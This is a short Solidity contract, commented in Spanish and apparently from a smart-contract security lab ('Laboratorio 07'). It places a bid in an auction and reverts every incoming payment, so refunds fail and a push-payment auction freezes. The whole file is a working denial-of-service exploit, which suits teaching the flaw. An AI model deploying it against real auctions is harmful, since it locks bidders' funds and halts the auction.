// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import {ISubasta} from "./ISubasta.sol";

/**
 * @title Postor hostil · Laboratorio 07
 * @notice Un contrato que puja y después rechaza cualquier pago que reciba.
 *         No roba nada: solo se niega a que le devuelvan su dinero.
 *         Contra la subasta push, eso basta para congelarla.
 */
contract PostorHostil {
    error NoAceptoPagos();

    function pujarEn(ISubasta subasta) external payable {
        subasta.pujar{value: msg.value}();
    }

    receive() external payable {
        revert NoAceptoPagos();
    }
}
